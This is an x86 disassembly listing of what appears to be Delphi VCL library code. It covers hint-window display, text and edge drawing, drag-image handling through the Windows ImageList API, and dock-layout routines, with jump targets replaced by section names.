mov esi eax
xor eax eax
push ebp
push sub_44824f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x210 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448256
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc0
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4403c4
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x208 ]
call sub_423cc8
mov edx eax
add edx 0x6
mov eax esi
call sub_43fb80
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_4403c4
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x208 ]
call sub_423ce4
mov edx eax
add edx 0x4
mov eax esi
call sub_43fba4
sub_44825c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_448435
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4403f4
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_44161c
mov eax [ esi ]
call sub_45da50
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
add edx [ ebp - 0x14 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_45da5c
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
add edx [ ebp - 0x18 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_45da50
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
call sub_45da44
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ esi ]
call sub_45da5c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
call sub_45da38
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ esi ]
call sub_45da44
mov [ ebp - 0x18 ] eax
push 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x214 ]
cmp eax 0xfa
jbe r-xdata
mov eax [ esi ]
call sub_45da38
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_4442e0
push 0x4
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44843c
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x214 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
mov eax ebx
call sub_40425c
cmp eax 0x64
jge r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1016
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1018
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_44b4b0
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x4 ]
call sub_446be4
push eax
call [ rw-data ]
sub_448444
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44846a
mov eax eax
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_418e04
mov eax esi
call sub_4426e4
or eax 0xc10
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_40445c
push eax
mov eax [ esi + 0x208 ]
call sub_423e68
push eax
call DrawTextA
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_4484c8
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_418e04
call sub_430fe0
call sub_4310c0
test al al
jne r-xdata
call sub_430fe0
lea ecx [ esp + 0x10 ]
mov dl 0x1
call sub_43134c
push esp
push 0x1
push 0xf
push 0x0
call sub_430fe0
lea ecx [ esp + 0x20 ]
mov edx esi
call sub_431130
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_448534
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_444be8
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
pop ebx
retn
sub_448558
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_448598
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
cmp [ ebx + 0x68 ] 0xffff
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push 0x1
push 0x1
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
push 0xd
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
call ImageList_Create
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_448658
push [ fs : eax ]
mov [ fs : eax ] esp
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45df24
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_42a810
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45df24
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_42a810
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
lea eax [ ebp - 0xc ]
push eax
push 0x0
call ImageList_GetDragImage
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call ImageList_Destroy
retn
sub_448664
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44d4f8
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x78 ] esi
mov [ ebx + 0x70 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_44d634
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x6a ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4486c4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_44d4f8
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x6a ] 0x0
jne r-xdata
mov eax esi
call sub_448598
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_448724
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x74 ]
push eax
mov ecx [ esi + 0x70 ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_448664
push 0x0
call ShowCursor
sub_448724
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_44d4f8
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x6c ]
je r-xdata
mov eax edi
call sub_448788
mov ebx esi
mov [ edi + 0x6c ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_448558
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x6c ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_448788
push ebx
mov ebx eax
mov eax ebx
call sub_44d4f8
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x6c ] eax
sub_4487ac
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44d4f8
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_448558
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_448820
push ebx
push esi
mov esi eax
mov eax esi
call sub_44d4f8
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x6a ] 0x0
je r-xdata
mov eax esi
call sub_448788
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x6a ] 0x0
or edx 0xffffffff
mov eax esi
call sub_4486ac
push 0xffffffff
call ShowCursor
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_448868
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4428d8
mov dl 0x1
mov eax [ r-xdata ]
call sub_423870
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_43efa0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_4488c4
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_40324c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4429fc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_448912
mov eax eax
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_423b74
xor eax eax
push ebp
push sub_4489b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_423ee8
xor eax eax
push ebp
push sub_44898f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_43efb8
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448996
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_423ee8
retn
sub_4489c4
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_448a58
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_4489e0
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_448a58
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
call sub_449050
mov esi eax
test esi esi
je r-xdata
mov bl [ edx + 0x57 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_448a58
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_448a8c
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_448b1c
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
mov edx 0x2
call sub_448b1c
jmp r-xdata
retn
sub_448ad4
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_448b88
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
mov edx 0x2
call sub_448b88
jmp r-xdata
retn
sub_448b1c
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
jmp r-xdata
mov edx [ esi + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov ecx edi
mov edx [ eax + 0x14 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
dec al
je r-xdata
mov eax edx
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x4 ]
jmp r-xdata
dec al
jne r-xdata
mov eax [ eax + 0x18 ]
call sub_448f50
jmp r-xdata
add esp 0x10
pop edi
pop esi
retn
xor eax eax
mov eax [ esp ]
jmp r-xdata
sub_448b88
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov eax [ esp + 0x8 ]
sub eax [ esp ]
jmp r-xdata
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_448a3c
dec eax
jne r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
cmp dl [ eax + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov eax esi
call sub_448f50
push eax
mov eax esi
call sub_448a8c
pop edx
xchg edx eax
sub eax edx
jmp r-xdata
mov eax edx
call sub_448f50
mov eax [ eax + 0x68 ]
jmp r-xdata
sub_448c38
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_448a3c
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_449050
mov ebx eax
mov al [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_448b88
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_448a3c
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_448b88
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_448a8c
mov edx eax
add edx esi
mov eax ebx
call sub_448f78
mov edx edi
mov eax ebx
call sub_448f78
jmp r-xdata
mov eax ebx
call sub_448dd8
mov eax ebx
call sub_449028
mov ebx eax
test ebx ebx
jne r-xdata
sub_448ce0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_403f9c
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_403ff0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9f4
call sub_4039d8
sub_448d24
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb9
call sub_403448
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] ebx
xor eax eax
push ebp
push sub_448d95
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_4410c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_448da8
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_449028
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_448dd8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
mov [ eax + 0x9c ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_448b88
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_448b88
mov esi eax
push ebp
call sub_448da8
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_449028
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_448b1c
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_448b1c
mov ecx ebx
pop edx
call sub_418e2c
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43fd84
mov eax [ ebp - 0x4 ]
call sub_448f50
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_448f50
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_448f50
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_448f50
push ebx
mov ebx eax
mov eax ebx
call sub_448a58
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_4489e0
test al al
je r-xdata
mov eax ebx
call sub_448a8c
pop ebx
retn
sub_448f8c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_448f78
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_448a28
test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_448f7c
mov edx esi
call sub_448f8c
sub_448fc8
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_448f50
mov edi eax
mov eax ebx
call sub_448a8c
cmp edi eax
jl r-xdata
mov eax esi
call sub_448c38
mov eax [ esi + 0x1c ]
push eax
push sub_44aad8
mov edx esi
call sub_449304
mov eax ebx
call sub_448f50
mov edi eax
mov eax esi
call sub_448ad4
cmp edi eax
jle r-xdata
mov eax ebx
call sub_448fc8
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_449034
push ebx
mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_448a58
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_44905c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_40321c
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x40000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
mov al [ eax + 0x5b ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_403570
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_448a04
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423578
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_42a2d0
mov edx eax
mov eax ebx
call sub_4236f4
mov eax [ ebp - 0x4 ]
call sub_44922c
xor eax eax
push ebp
push sub_449168
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_4438dc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_448c38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44916f
mov eax [ ebp - 0x4 ]
call sub_449230
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4438a0
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_44916f
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_4491c4
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_44a230
mov eax [ esi + 0x10 ]
call sub_40324c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40323c
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_449244
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_449244
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_449244
pop ecx
sub_44929c
push ebp
